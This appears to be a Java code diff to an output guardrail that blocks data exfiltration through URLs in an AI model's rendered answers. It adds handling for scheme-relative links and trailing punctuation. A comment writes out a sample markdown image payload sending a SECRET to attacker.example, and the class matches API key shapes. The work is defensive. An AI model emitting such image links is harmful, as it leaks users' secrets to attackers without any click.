@@ -45,12 +45,35 @@ public class ExfiltrationGuardrail implements OutputGuardrail {
      */
     private static final Pattern MARKDOWN_URL = Pattern.compile("!?\\[[^\\]]*]\\(\\s*([^)\\s]+)");
     private static final Pattern BARE_URL = Pattern.compile("\\bhttps?://([^\\s/\"'<>)\\]]+)", Pattern.CASE_INSENSITIVE);
+
+    /**
+     * A scheme-relative destination: {@code //host/path}, which a browser fetches
+     * over the page's own scheme.
+     *
+     * <p>It is the exfiltration payload this class exists to stop, wearing the one
+     * disguise the bare-URL pattern cannot see: no scheme, so {@code hostOf} returns
+     * null and the scan reads it as a harmless relative link. {@code ![x](//attacker
+     * .example/p.png?d=SECRET)} then renders with no click at all.
+     */
+    private static final Pattern SCHEME_RELATIVE = Pattern.compile("^//([^/\\s?#]+)");
+
+    /**
+     * Sentence punctuation that a URL may end with but does not own.
+     *
+     * <p>"Fonte: https://api.open-meteo.com." captures {@code api.open-meteo.com.}
+     * with the full stop attached, and that string equals no allowed domain and ends
+     * with no allowed suffix — so citing a source that IS on the allow-list withheld
+     * the whole answer. A comma, a semicolon, a closing bracket and an exclamation
+     * mark all do the same.
+     */
+    private static final Pattern TRAILING_PUNCTUATION = Pattern.compile("[.,;:!?'\"\\)\\]}]+$");
     private static final Pattern DATA_URI = Pattern.compile("data:[^;\\s]+;base64,", Pattern.CASE_INSENSITIVE);
 
     /**
      * Provider key shapes. Deliberately narrow: a broad rule would eat ordinary base64.
      */
     private static final List<Pattern> SECRET_SHAPES = List.of(
+            //TODO ADD GITLAB, BADROCK, ANTHROPIC
             Pattern.compile("\\bsk-[A-Za-z0-9_-]{20,}"),          // OpenAI
             Pattern.compile("\\bAIza[0-9A-Za-z_-]{35}"),           // Google
             Pattern.compile("\\bAKIA[0-9A-Z]{16}\\b"),             // AWS access key id
@@ -102,9 +125,11 @@ public class ExfiltrationGuardrail implements OutputGuardrail {
     private String scan(Matcher matcher, boolean wholeUrl) {
         while (matcher.find()) {
             String candidate = matcher.group(1);
-            String host = wholeUrl ? hostOf(candidate) : candidate.toLowerCase(Locale.ROOT);
+            String host = wholeUrl ? hostOf(candidate) : trimPunctuation(candidate);
             if (host == null) {
-                // A relative markdown link has no host and cannot exfiltrate.
+                // A genuinely relative markdown link — "/docs/x" or "#section" — has
+                // no host and cannot exfiltrate. "//host/path" is NOT that, and
+                // hostOf resolves it above rather than falling through to here.
                 continue;
             }
             if (!isAllowed(host)) {
@@ -116,7 +141,17 @@ public class ExfiltrationGuardrail implements OutputGuardrail {
 
     private static String hostOf(String url) {
         var matcher = BARE_URL.matcher(url);
-        return matcher.find() ? matcher.group(1).toLowerCase(Locale.ROOT) : null;
+        if (matcher.find()) {
+            return trimPunctuation(matcher.group(1));
+        }
+        var relative = SCHEME_RELATIVE.matcher(url);
+        return relative.find() ? trimPunctuation(relative.group(1)) : null;
+    }
+
+    /** Lower-cases, and drops the sentence punctuation the URL pattern swept up. */
+    private static String trimPunctuation(String host) {
+        String bare = TRAILING_PUNCTUATION.matcher(host.toLowerCase(Locale.ROOT)).replaceAll("");
+        return bare.isBlank() ? null : bare;
     }
 
     private boolean isAllowed(String host) {
